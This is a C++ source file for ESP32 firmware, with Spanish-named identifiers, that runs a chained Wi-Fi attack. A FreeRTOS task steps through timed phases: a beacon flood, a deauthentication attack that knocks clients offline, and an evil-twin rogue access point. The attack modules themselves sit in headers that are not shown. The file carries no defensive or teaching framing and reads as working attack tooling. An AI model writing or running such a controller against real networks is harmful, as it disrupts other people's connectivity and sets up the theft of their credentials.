#include "chain_controller.h"
#include "config.h"
#include "beacon_flood.h"
#include "deauth_module.h"
#include "evil_twin.h"
#include "api_server.h"
#include <freertos/FreeRTOS.h>
#include <freertos/task.h>
#include <Arduino.h>
#include <string.h>

EstadoCadenaInfo g_chain_state;

static TaskHandle_t _ctrl_task = nullptr;
static char _modo[32] = {0};

static void transition_to(EstadoCadena next) {
    g_chain_state.estado = next;
    g_chain_state.fase_inicio_ms = millis();
    const char* s = estado_to_string(next);
    char payload[64];
    snprintf(payload, sizeof(payload), "{\"fase\":\"%s\"}", s);
    emit_event("phase_change", payload);
    Serial.printf("[INFO] [%lu] Phase -> %s\n", millis(), s);
}

static void chain_task(void* pvParam) {
    // FASE_1: Beacon Flood
    transition_to(EstadoCadena::FASE_1_BEACON);
    beacon_flood_task_start();
    unsigned long t = millis();
    while (g_chain_state.ataque_activo &&
           (millis() - t) < (unsigned long)(g_config.duracion_beacon * 1000UL)) {
        vTaskDelay(pdMS_TO_TICKS(100));
    }
    beacon_flood_task_stop();
    if (!g_chain_state.ataque_activo) goto done;

    // FASE_2: Deauth
    transition_to(EstadoCadena::FASE_2_DEAUTH);
    deauth_task_start();
    t = millis();
    while (g_chain_state.ataque_activo &&
           (millis() - t) < (unsigned long)(g_config.duracion_deauth * 1000UL)) {
        vTaskDelay(pdMS_TO_TICKS(100));
    }
    deauth_task_stop();
    if (!g_chain_state.ataque_activo) goto done;

    // FASE_3: Evil Twin
    transition_to(EstadoCadena::FASE_3_EVIL);
    evil_twin_start();
    t = millis();
    while (g_chain_state.ataque_activo &&
           (millis() - t) < (unsigned long)(g_config.duracion_evil_twin * 1000UL)) {
        vTaskDelay(pdMS_TO_TICKS(100));
    }
    evil_twin_stop();

done:
    transition_to(EstadoCadena::FINALIZADO);
    g_chain_state.ataque_activo = false;
    _ctrl_task = nullptr;
    vTaskDelete(nullptr);
}

void chain_controller_init() {
    memset(&g_chain_state, 0, sizeof(g_chain_state));
    g_chain_state.estado = EstadoCadena::IDLE;
}

void chain_controller_start(const char* modo) {
    if (g_chain_state.ataque_activo) return;
    strncpy(_modo, modo, sizeof(_modo) - 1);
    g_chain_state.ataque_activo = true;
    xTaskCreatePinnedToCore(chain_task, "chain_ctrl", 4096, nullptr,
                            tskIDLE_PRIORITY + 3, &_ctrl_task, 0);
}

void chain_controller_stop() {
    g_chain_state.ataque_activo = false;
    // Task self-exits; wait briefly
    vTaskDelay(pdMS_TO_TICKS(200));
    g_chain_state.estado = EstadoCadena::IDLE;
    _ctrl_task = nullptr;
}

bool is_phase_active(EstadoCadena fase) {
    return g_chain_state.estado == fase && g_chain_state.ataque_activo;
}

const char* estado_to_string(EstadoCadena e) {
    switch (e) {
        case EstadoCadena::IDLE:           return "IDLE";
        case EstadoCadena::FASE_1_BEACON:  return "FASE_1";
        case EstadoCadena::FASE_2_DEAUTH:  return "FASE_2";
        case EstadoCadena::FASE_3_EVIL:    return "FASE_3";
        case EstadoCadena::FINALIZADO:     return "FINALIZADO";
        default:                           return "ERROR";
    }
}
